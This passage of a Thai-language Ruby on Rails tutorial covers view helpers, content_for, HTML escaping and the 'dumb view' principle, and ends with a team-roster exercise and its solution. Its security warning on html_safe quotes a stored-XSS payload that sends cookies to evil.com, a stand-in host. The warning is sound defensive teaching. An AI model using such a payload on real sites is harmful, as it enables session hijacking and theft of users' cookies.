# app/helpers/team_helper.rb
module TeamHelper
  ROLE_LABELS = {
    owner: "เจ้าของทีม",
    admin: "แอดมิน",
    member: "สมาชิก"
  }.freeze

  ROLE_COLORS = {
    owner: "gold",
    admin: "blue",
    member: "gray"
  }.freeze

  def role_badge(role)
    label = ROLE_LABELS.fetch(role, "ไม่ทราบตำแหน่ง")
    color = ROLE_COLORS.fetch(role, "gray")

    content_tag(:span, label, class: "badge badge-#{color}")
  end
end
```

```erb
<%= role_badge(:owner) %>
<%# => <span class="badge badge-gold">เจ้าของทีม</span> — ทดสอบ render จริงแล้วได้ผลตรงนี้เป๊ะ %>
```

### ทำไมต้องเขียนเป็น helper แทนที่จะเขียน logic ตรงๆ ใน ERB

เทียบกับการเขียน logic เดิมซ้ำตรงๆ ใน template:

```erb
<%# แบบไม่ดี — logic กระจัดกระจายอยู่ใน view โดยตรง ซ้ำได้ทุกที่ที่ต้องแสดง badge %>
<% if member.role == :owner %>
  <span class="badge badge-gold">เจ้าของทีม</span>
<% elsif member.role == :admin %>
  <span class="badge badge-blue">แอดมิน</span>
<% else %>
  <span class="badge badge-gray">สมาชิก</span>
<% end %>
```

ข้อดีของการย้ายไป helper:

1. **ทดสอบได้แยกจาก view** — เขียน unit test เรียก `role_badge(:owner)` ตรงๆ ได้โดยไม่ต้อง
   render HTML เต็มหน้า (จะสอนละเอียดใน Part 018/019 เรื่อง testing ที่ผ่านมาแล้ว และจะกลับมา
   ใช้จริงกับ Rails ใน Part 046)
2. **Reuse ได้ทุกที่** — เรียก `role_badge(member.role)` จากกี่ view ก็ได้ ไม่ต้อง copy-paste
   `if/elsif` ซ้ำ
3. **แก้ที่เดียว** — ถ้าวันหนึ่งต้องเพิ่ม role ใหม่ หรือเปลี่ยนสี แก้แค่ใน `TeamHelper` จุดเดียว

### Helper เฉพาะ controller เดียว (ไม่ share ทั้งแอป)

ถ้าต้องการจำกัดให้ helper ใช้ได้เฉพาะ controller ของตัวเอง (ไม่ให้ leak ไป controller อื่น)
ปิดการ include อัตโนมัติแบบ global ใน `config/application.rb`:

```ruby
# config/application.rb
config.action_controller.include_all_helpers = false
```

จากนั้นแต่ละ controller จะมองเห็นแค่ helper module ที่ชื่อตรงกับตัวเอง
(`TeamsController` ↔ `TeamsHelper`) บวกกับ `ApplicationHelper` ที่ทุก controller มองเห็นเสมอ
เพราะสืบทอดมาจาก `ApplicationController` — วิธีนี้เหมาะกับโปรเจกต์ขนาดใหญ่ที่ต้องการ
namespace ชัดเจน ส่วนโปรเจกต์เล็ก-กลางส่วนใหญ่ปล่อย default (`true`) ไว้ก็เพียงพอ

### `ApplicationHelper` — ที่เก็บ helper ที่ใช้ร่วมกันทั้งแอปจริงๆ

```ruby
# app/helpers/application_helper.rb
module ApplicationHelper
  def page_title(title)
    title.present? ? "#{title} | MyApp" : "MyApp"
  end

  def flash_class(type)
    { notice: "alert-info", alert: "alert-danger", success: "alert-success" }
      .fetch(type.to_sym, "alert-secondary")
  end
end
```

Helper ที่เกี่ยวกับ concept กว้างๆ ของทั้งแอป (page title, การ format flash message ที่ใช้ทุก
หน้า) ควรอยู่ใน `ApplicationHelper` ส่วน helper ที่เกี่ยวกับ resource เฉพาะเจาะจง (เช่น
`role_badge` ที่เกี่ยวกับ team member) ควรอยู่ใน helper module ของ resource นั้นแทน

---

## Step 239: `content_for` และ `yield(:name)` — แทรกเนื้อหาเฉพาะจุดใน layout

`<%= yield %>` เดี่ยวๆ รับได้แค่ "เนื้อหาหลัก" หนึ่งก้อน แต่บางครั้งเราต้องการให้แต่ละหน้า
กำหนดเนื้อหาเฉพาะจุดอื่นใน layout ได้ด้วย เช่น `<title>` ที่ต่างกันไปตามหน้า, หรือ CSS/JS
เพิ่มเติมเฉพาะบางหน้าใน `<head>` — นี่คือหน้าที่ของ `content_for`

### หลักการทำงาน

1. ใน layout ประกาศจุดที่รอรับเนื้อหาด้วย `yield(:ชื่อ)` (ระบุ symbol ต่างจาก `yield` เปล่า)
2. ใน view ของแต่ละหน้า เรียก `content_for(:ชื่อ) { ... }` เพื่อ "ฝาก" เนื้อหาไว้
3. Rails render view ปกติก่อน (ซึ่งจะเก็บเนื้อหาจาก `content_for` ไว้ใน buffer) แล้วค่อย
   render layout ทีหลัง ทำให้ตอน layout ถึงจุด `yield(:ชื่อ)` เนื้อหาที่ฝากไว้พร้อมใช้แล้ว

### ตัวอย่าง: ตั้ง `<title>` เฉพาะหน้า (แบบเดียวกับที่ Rails 8 generate ให้ default)

```erb
<%# app/views/layouts/application.html.erb %>
<title><%= content_for(:title) || "MyApp" %></title>
```

```erb
<%# app/views/teams/index.html.erb %>
<% content_for(:title, "ทีมของฉัน — MyApp") %>

<h1>ทีมของฉัน</h1>
```

ทดสอบ render จริงแล้วได้ `<title>ทีมของฉัน — MyApp</title>` ตามที่คาดไว้ — ถ้าหน้าไหนไม่ได้
เรียก `content_for(:title)` เลย จะ fallback ไปใช้ `"MyApp"` เพราะ `content_for(:title)` คืน
ค่า `nil` เมื่อไม่มีใครฝากเนื้อหาไว้ (ใช้ `||` เป็นค่า default ได้ตามปกติ)

`content_for` เขียนได้ 2 แบบ ความหมายเหมือนกัน:

```erb
<% content_for(:title, "ข้อความสั้นๆ") %>
<%# หรือแบบ block เมื่อเนื้อหายาว/มี tag ประกอบ %>
<% content_for(:title) do %>
  ทีมของฉัน — MyApp
<% end %>
```

### ตัวอย่าง: แทรก CSS/JS เพิ่มเติมเฉพาะบางหน้าใน `<head>`

```erb
<%# layout %>
<head>
  ...
  <%= yield :head %>
</head>
```

```erb
<%# app/views/reports/dashboard.html.erb — หน้านี้ต้องการ chart library เพิ่ม %>
<% content_for(:head) do %>
  <meta name="description" content="แดชบอร์ดสรุปยอดขาย">
  <%= stylesheet_link_tag "dashboard" %>
<% end %>

<h1>แดชบอร์ด</h1>
```

ทดสอบจริงแล้วยืนยันว่า `<meta name="description" ...>` ที่ฝากผ่าน `content_for(:head)` ไป
ปรากฏอยู่ในตำแหน่ง `yield :head` ของ layout พอดี โดยหน้าอื่นที่ไม่ได้เรียก `content_for(:head)`
เลยจะไม่มี meta tag นี้ปนมาด้วย — คนละกรณีกับ instance variable ที่ต้อง set ทุก action ไม่งั้น
`nil`

### `content_for?` — เช็คว่ามีใครฝากเนื้อหาไว้หรือยัง

```erb
<% if content_for?(:sidebar) %>
  <aside><%= yield :sidebar %></aside>
<% else %>
  <aside class="sidebar-default">เมนูเริ่มต้น</aside>
<% end %>
```

### พฤติกรรม "สะสม" (append) ของ `content_for`

ค่า default ของ `content_for` คือ**สะสมต่อท้าย**ถ้าเรียกซ้ำหลายครั้งด้วย key เดียวกัน (ไม่ใช่
เขียนทับ) มีประโยชน์เมื่อ partial หลายตัวต้องการฝาก CSS/JS ของตัวเองเพิ่มเข้าไปใน `<head>`
พร้อมกัน:

```erb
<% content_for(:head) { tag.meta(name: "author", content: "Team A") } %>
...
<% content_for(:head) { javascript_include_tag "chart" } %>
<%# ทั้งสอง meta/script จะไปปรากฏรวมกันที่ yield :head %>
```

ถ้าต้องการ**เขียนทับ**ของเดิมแทนการสะสม ใช้ `flush: true`:

```erb
<% content_for(:title, "หัวข้อใหม่", flush: true) %>
```

---

## Step 240: Escaping, `html_safe`/`raw` และการเขียน View ให้ "โง่" (dumb)

### HTML Escaping อัตโนมัติ

ตั้งแต่ Rails 3 เป็นต้นมา `<%= %>` จะ **escape HTML ให้อัตโนมัติเสมอ** เพื่อป้องกัน
Cross-Site Scripting (XSS) — ทดสอบจริงด้วยการใส่ค่าที่มี tag อันตรายลงในตัวแปร:

```ruby
member.name #=> "<script>alert('x')</script>"
```

```erb
<%= member.name %>
```

ผลลัพธ์ HTML ที่ render ออกมาจริง **ไม่ใช่** `<script>` ที่รันได้ แต่เป็น text ที่ escape
เรียบร้อยแล้ว:

```html
&lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;
```

Browser จะแสดงข้อความ `<script>alert('x')</script>` เป็น **ตัวหนังสือธรรมดา** บนหน้าเว็บ
ไม่ใช่รันเป็นโค้ด JavaScript — นี่คือการป้องกัน XSS ขั้นพื้นฐานที่สุดที่ Rails ทำให้ฟรี
ทุกครั้งที่ใช้ `<%= %>` โดยไม่ต้องเขียนอะไรเพิ่ม

### `html_safe` และ `raw` — ทางออกจาก escaping (และความเสี่ยงที่มากับมัน)

บางครั้งเราต้องการแสดง HTML จริงๆ (ไม่ใช่ escape) เช่น เนื้อหาบทความที่เก็บเป็น HTML ไว้แล้ว
ทำได้ 2 วิธีที่ความหมายเหมือนกัน:

```erb
<%= raw(@post.body_html) %>
<%= @post.body_html.html_safe %>
```

ทั้งสองวิธีบอก Rails ว่า **"string นี้ปลอดภัย ไม่ต้อง escape นะ"** — โดย `html_safe` คืนค่า
เป็น `ActiveSupport::SafeBuffer` (ยืนยันด้วยการทดสอบจริง: `"<b>x</b>".html_safe.class` ได้
`ActiveSupport::SafeBuffer`) ซึ่ง view จะไม่ escape ซ้ำอีกเมื่อเจอ object ชนิดนี้

> **คำเตือนด้านความปลอดภัยที่สำคัญมาก:** `html_safe`/`raw` เป็นการ **"สัญญา" กับ Rails ว่า
> string นี้ปลอดภัยแน่นอน** ทั้งที่ Rails ไม่ได้ตรวจสอบอะไรให้เลย ถ้าเผลอเรียก `html_safe` กับ
> string ที่มาจาก**ผู้ใช้โดยตรง** (เช่น comment, ชื่อ, ข้อความในฟอร์ม) โดยไม่ได้ sanitize
> ก่อน จะเปิดช่องให้เกิด **Stored XSS attack** ทันที — ผู้ใช้ที่เป็นอันตรายพิมพ์
> `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
> ลงในช่อง comment แล้วถ้าโค้ดฝั่ง view เขียนแบบ `<%= comment.body.html_safe %>` สคริปต์นั้น
> จะถูกรันจริงในเบราว์เซอร์ของผู้ใช้คนอื่นที่มาดูหน้านั้น (เช่น ขโมย cookie/session)
>
> **กฎปฏิบัติ:** ใช้ `html_safe`/`raw` เฉพาะกับเนื้อหาที่มาจากแหล่งที่เชื่อถือได้เท่านั้น
> (เช่น HTML ที่แอปสร้างขึ้นเองจาก helper, หรือเนื้อหาที่ผ่านการ sanitize มาแล้วด้วย
> `sanitize()` ซึ่งจะกรอง tag/attribute อันตรายออกให้) **ห้าม** ใช้กับ input ดิบจากผู้ใช้
> เด็ดขาด เนื้อหาเรื่อง XSS แบบเจาะลึก การตั้งค่า Content Security Policy และการป้องกัน
> ช่องโหว่อื่นๆ ของ Rails จะพูดถึงแบบเต็มรูปแบบใน **Part 079 (OWASP Top 10 ใน context ของ
> Rails)**

ถ้าต้องการแสดง HTML ที่มาจากผู้ใช้แบบปลอดภัยกว่าใช้ `sanitize` ซึ่งจะกรอง tag/attribute
อันตราย (เช่น `<script>`, `onclick=`) ออกโดยอัตโนมัติ แต่ยังคง tag ที่ปลอดภัย
(`<b>`, `<i>`, `<p>`, ...) ไว้:

```erb
<%= sanitize(comment.body) %>
```

### เขียน Logic ใน ERB ได้ — แต่ควรเขียนแค่ไหน (แนวคิด "Dumb View")

ERB รองรับ control flow ของ Ruby เต็มรูปแบบ (`if`, `each`, `case`, ฯลฯ) ทำให้เขียน logic
ซับซ้อนลงไปตรงๆ ใน view ได้ง่ายเกินไป:

```erb
<%# ตัวอย่างที่ไม่ดี — logic ทางธุรกิจ (business logic) ปนอยู่ลึกใน view %>
<% if @post.published_at.present? && @post.published_at <= Time.current &&
      !@post.archived? && (current_user.admin? || @post.author == current_user) %>
  <span class="badge badge-live">กำลังเผยแพร่</span>
<% end %>
```

โค้ดแบบนี้มีปัญหาหลายอย่าง: ทดสอบยาก (ต้อง render HTML เต็มเพื่อทดสอบ logic), อ่านยาก,
และถ้า logic เดียวกันต้องใช้ซ้ำอีกหน้า ก็ต้อง copy-paste เงื่อนไขทั้งยาวนี้อีกรอบ

**แนวทางที่ดีกว่า — ย้าย logic ออกจาก view ไปไว้ใน method ที่เหมาะสม:**

```ruby
# app/models/post.rb (business logic เกี่ยวกับตัว post เอง ควรอยู่ใน model)
class Post < ApplicationRecord
  def publicly_visible?
    published_at.present? && published_at <= Time.current && !archived?
  end

  def editable_by?(user)
    user.admin? || author == user
  end
end
```

```erb
<%# view ที่เหลือแค่ "ถาม" ไม่ต้อง "คิด" เอง — อ่านแล้วเข้าใจทันที %>
<% if @post.publicly_visible? %>
  <span class="badge badge-live">กำลังเผยแพร่</span>
<% end %>
```

หลักการที่ควรจำไว้เสมอเมื่อเขียน view ใน Rails:

1. **View ควรมีแค่ logic การแสดงผล (presentation logic)** เช่น "ถ้ามีรายการ ให้วน" "ถ้าเป็น
   `nil` ให้โชว์ placeholder" — ไม่ใช่ business rule ว่า "โพสต์นี้นับว่าเผยแพร่แล้วหรือยัง"
2. **Business logic ควรอยู่ใน Model** (method ที่ตอบคำถามเกี่ยวกับ object นั้นๆ เช่น
   `post.publicly_visible?`) — จะเจาะลึกเรื่อง Model ตั้งแต่ Part 025 เป็นต้นไป
3. **Logic การจัดรูปแบบ/สร้าง HTML ที่ใช้ซ้ำ ควรอยู่ใน Helper** (เช่น `role_badge` ใน
   Step 238)
4. **เงื่อนไข/การจัดกลุ่มข้อมูลที่ซับซ้อนมากๆ** (มากกว่าที่ helper method ง่ายๆ จะจัดการได้
   สะดวก) ในโปรเจกต์ระดับสูงขึ้นมักย้ายไปไว้ใน **Presenter/Decorator object** ซึ่งจะพูดถึง
   อย่างละเอียดใน **Part 083** — ตอนนี้จำแค่หลักการ "helper สำหรับ HTML ที่ reuse, model
   method สำหรับ business rule" ก็เพียงพอสำหรับด่านนี้

ทดสอบง่ายๆ ว่า logic ใน view ของเรา "โง่" พอหรือยัง: ลองอ่าน `.html.erb` โดยไม่รู้บริบทของแอป
เลย — ถ้าต้องคิดตามเงื่อนไขซับซ้อนหลายชั้นถึงจะเข้าใจว่าเมื่อไหร่ badge จะโชว์ แปลว่า logic
นั้นควรถูกย้ายออกไปอยู่ใน method ที่มีชื่อสื่อความหมายแทน

---

## แบบฝึกหัด: หน้ารายชื่อทีม (Team Roster) แบบ Reuse ได้ทั้งระบบ

### โจทย์

สร้างหน้าแสดงรายชื่อสมาชิกทีม (`/teams`) โดยกำหนดให้:

1. Controller `TeamsController#index` เตรียมข้อมูลชื่อทีมและรายชื่อสมาชิก (ใช้ข้อมูลจำลอง
   ในหน่วยความจำไปก่อน เพราะเรายังไม่ได้เรียน ActiveRecord — จะเริ่มใน Part 025)
2. หน้า `index` ต้องตั้งชื่อ `<title>` เฉพาะหน้าผ่าน `content_for(:title)`
3. รายชื่อสมาชิกแต่ละคนต้อง render ผ่าน partial ชื่อ `_member` โดยใช้ collection render
   (ไม่ใช้ `each` เขียนเอง)
4. แต่ละแถวต้องแสดง badge บทบาท (role) ผ่าน custom helper ชื่อ `role_badge`
5. ต้องมั่นใจว่าชื่อสมาชิกที่มีอักขระ HTML แปลกปลอมถูก escape อัตโนมัติ ไม่ทำให้เกิด XSS

### เฉลย

**Routes:**

```ruby
# config/routes.rb
Rails.application.routes.draw do
  root "teams#index"
  get "teams", to: "teams#index"
end
```

**Controller:**

```ruby
# app/controllers/teams_controller.rb
class TeamsController < ApplicationController
  # ในโปรเจกต์จริง Member จะเป็น ActiveRecord model (Part 025 เป็นต้นไป)
  # ตอนนี้ใช้ Struct จำลองข้อมูลไปก่อนเพื่อโฟกัสเรื่อง View ล้วนๆ
  Member = Struct.new(:name, :role, :email, :joined_on)

  def index
    @team_name = "Rails Warriors"
    @members = [
      Member.new("สมชาย ใจดี", :owner, "somchai@example.com", Date.new(2023, 1, 15)),
      Member.new("มานี รักเรียน", :admin, "manee@example.com", Date.new(2023, 6, 1)),
      Member.new("<script>alert('x')</script>", :member, "danger@example.com",
                 Date.new(2024, 2, 10))
    ]
  end
end
```

**Helper:**

```ruby
# app/helpers/team_helper.rb
module TeamHelper
  ROLE_LABELS = {
    owner: "เจ้าของทีม",
    admin: "แอดมิน",
    member: "สมาชิก"
  }.freeze

  ROLE_COLORS = {
    owner: "gold",
    admin: "blue",
    member: "gray"
  }.freeze

  def role_badge(role)
    label = ROLE_LABELS.fetch(role, "ไม่ทราบตำแหน่ง")
    color = ROLE_COLORS.fetch(role, "gray")

    content_tag(:span, label, class: "badge badge-#{color}")
  end
end
```

**View หลัก:**

```erb
<%# app/views/teams/index.html.erb %>
<% content_for(:title, "ทีม #{@team_name} — Views Demo") %>

<h1><%= @team_name %></h1>
<p>จำนวนสมาชิกทั้งหมด <%= pluralize(@members.size, "คน", plural: "คน") %></p>

<ul class="member-list">
  <%= render partial: "member", collection: @members, as: :member %>
</ul>
```

**Partial:**

```erb
<%# app/views/teams/_member.html.erb %>
<li class="member-item">
  <strong><%= member.name %></strong>
  <%= role_badge(member.role) %>
  <span><%= member.email %></span>
  <span>เข้าร่วมเมื่อ <%= member.joined_on.strftime("%d/%m/%Y") %></span>
</li>
```

### ผลลัพธ์ที่ทดสอบ render จริงบน Rails 8.1

```html
<title>ทีม Rails Warriors — Views Demo</title>
...
<h1>Rails Warriors</h1>
<p>จำนวนสมาชิกทั้งหมด 3 คน</p>

<ul class="member-list">
  <li class="member-item">
    <strong>สมชาย ใจดี</strong>
    <span class="badge badge-gold">เจ้าของทีม</span>
    <span>somchai@example.com</span>
    <span>เข้าร่วมเมื่อ 15/01/2023</span>
  </li>
  <li class="member-item">
    <strong>มานี รักเรียน</strong>
    <span class="badge badge-blue">แอดมิน</span>
    <span>manee@example.com</span>
    <span>เข้าร่วมเมื่อ 01/06/2023</span>
  </li>
  <li class="member-item">
    <strong>&lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;</strong>
    <span class="badge badge-gray">สมาชิก</span>
    <span>danger@example.com</span>
    <span>เข้าร่วมเมื่อ 10/02/2024</span>
  </li>
</ul>
```

สังเกตแถวที่ 3: string `<script>alert('x')</script>` ที่ตั้งใจใส่เป็นชื่อสมาชิก **ถูก escape
อัตโนมัติ** กลายเป็นตัวหนังสือธรรมดา (`&lt;script&gt;...`) ไม่ถูกรันเป็นโค้ด — ยืนยันว่า
default behavior ของ `<%= %>` ปลอดภัยจาก XSS โดยไม่ต้องทำอะไรเพิ่มเติมเลย และจาก server log
ยังยืนยันด้วยว่า Rails ใช้ **collection render** จริง (ไม่ใช่ `each` ธรรมดา):

```
Rendered collection of teams/_member.html.erb [3 times] (Duration: 0.4ms | GC: 0.0ms)
```

### แบบฝึกหัดเพิ่มเติม (ทำเอง ไม่มีเฉลย)

1. เพิ่ม partial `_empty_state.html.erb` ที่แสดงข้อความ "ยังไม่มีสมาชิกในทีม" แล้วแก้
   `index.html.erb` ให้แสดง partial นี้แทนเมื่อ `@members` ว่างเปล่า (ใบ้: ใช้ `||` ต่อท้าย
   `render partial:, collection:` ตามที่สอนใน Step 236 หรือเช็ค `@members.any?` ก่อน)
2. เพิ่ม helper ชื่อ `member_tenure_in_words(member)` ที่คำนวณและคืนข้อความว่าสมาชิกคนนั้น
   อยู่ในทีมมากี่เดือน/ปีแล้ว (เช่น "อยู่ในทีมมา 1 ปี 8 เดือน") แล้วเรียกใช้ใน `_member`
   partial — ให้คิดว่า logic คำนวณนี้ควรอยู่ใน helper หรือควรย้ายไปเป็น method ของ `Member`
   เอง (ทบทวนหลักการ Step 240)
3. เพิ่ม route และ view `teams/show` ที่แสดงรายละเอียดสมาชิกทีละคน (`/teams/members/:index`)
   โดยให้ layout ของหน้านี้มี sidebar เพิ่มขึ้นมาหนึ่งจุด ใช้ `content_for(:sidebar)` +
   `yield(:sidebar)` ตามที่สอนใน Step 239 เพื่อแสดงเมนู "กลับไปหน้ารายชื่อทีม"
4. (ท้าทายขึ้น) ลองแก้ `Member` struct ให้มี method `to_partial_path` คืนค่า `"teams/member"`
   แล้วทดลองเปลี่ยน `render partial: "member", collection: @members` ในข้อ 1 เป็นรูปย่อ
   `render @members` — สังเกตว่าตอนนี้มันทำงานได้แล้วโดยไม่ error เหมือนที่อธิบายไว้ใน
   Step 236 (นี่คือกลไกเดียวกับที่ทำให้ `render @posts` ใช้ได้ฟรีกับ ActiveRecord model
   ทุกตัวโดยไม่ต้องเขียน method นี้เอง เพราะ ActiveRecord implement มันไว้ให้อยู่แล้ว)

---

## สรุปสิ่งที่ได้เรียนรู้ใน Part นี้

- ERB มี 3 tag หลัก: `<%= %>` (แสดงผล), `<% %>` (รันเฉยๆ ไม่แสดงผล), `<%# %>` (comment) และ
  เข้าใจว่าทำไมลืมใส่ `=` ถึงทำให้ผลลัพธ์หายเงียบๆ
- เข้าใจ **view lookup convention**: `controller#action` → หา
  `app/views/controller_name/action_name.html.erb` อัตโนมัติ และรู้จัก error
  `ActionView::MissingTemplate` เมื่อหาไม่เจอ
- ใช้ `app/views/layouts/application.html.erb` และ `<%= yield %>` เพื่อครอบทุกหน้าด้วย
  โครงสร้างเดียวกัน พร้อมรู้วิธีเปลี่ยน/ปิด layout เฉพาะ controller หรือ action
- ส่งข้อมูลจาก Controller ไป View ได้ 2 แบบ: **instance variable** (`@variable`, สะดวกแต่
  พิมพ์ผิดชื่อแล้วเงียบเป็น `nil`) และ **`locals:`** (explicit กว่า ปลอดภัยกว่า โดยเฉพาะกับ
  partial)
- แตกโค้ดซ้ำออกเป็น **partial** (`_name.html.erb`, เรียกด้วย `render "name"`) และ render
  ทับ collection อย่างมีประสิทธิภาพด้วย `render partial:, collection:` พร้อมรู้จักข้อจำกัด
  ของรูปย่อ `render @collection` ที่ใช้ได้เฉพาะ ActiveModel-compatible object
- ใช้ view helper มาตรฐาน (`link_to`, `image_tag`, `content_tag`/`tag.x`, `truncate`,
  `number_to_currency`, `pluralize`) พร้อมรู้ gotcha ของ `pluralize`/`truncate` กับภาษาไทย
- เขียน custom helper ของตัวเองใน `app/helpers/` เพื่อ reuse logic การแสดงผล และเข้าใจว่า
  helper ถูก include เข้า view ของทุก controller โดย default
- ใช้ `content_for` คู่กับ `yield(:name)` เพื่อแทรกเนื้อหาเฉพาะจุด (title, extra head content)
  ที่ต่างกันไปในแต่ละหน้า โดยไม่ต้องแก้ layout
- เข้าใจว่า `<%= %>` escape HTML อัตโนมัติเพื่อป้องกัน XSS และรู้ความเสี่ยงของการใช้
  `html_safe`/`raw` กับข้อมูลที่ไม่น่าเชื่อถือ (จะเจาะลึกเต็มรูปแบบใน Part 079)
- เข้าใจหลักการเขียน View ให้ "โง่" (dumb view) — logic ทางธุรกิจอยู่ใน Model, logic การ
  แสดงผลที่ reuse ได้อยู่ใน Helper, และ view ทำหน้าที่แค่ "ถาม" ไม่ใช่ "คิด" เอง

**ต่อไป (Part 025):** เราจะเริ่มเข้าสู่หัวใจของ Rails ฝั่งข้อมูล — **Model & ActiveRecord
เบื้องต้น** ตั้งแต่การเขียน migration เพื่อสร้างตาราง, การอ่านไฟล์ `db/schema.rb`, ไปจนถึงการ
ทำ CRUD (Create, Read, Update, Delete) ผ่าน `rails console` แบบยังไม่ต้องผ่านหน้าเว็บเลย —
ซึ่งจะทำให้ตัวอย่าง `Member` แบบ `Struct` จำลองใน Part นี้กลายเป็นข้อมูลจริงที่บันทึกลง
ฐานข้อมูลได้ถาวร
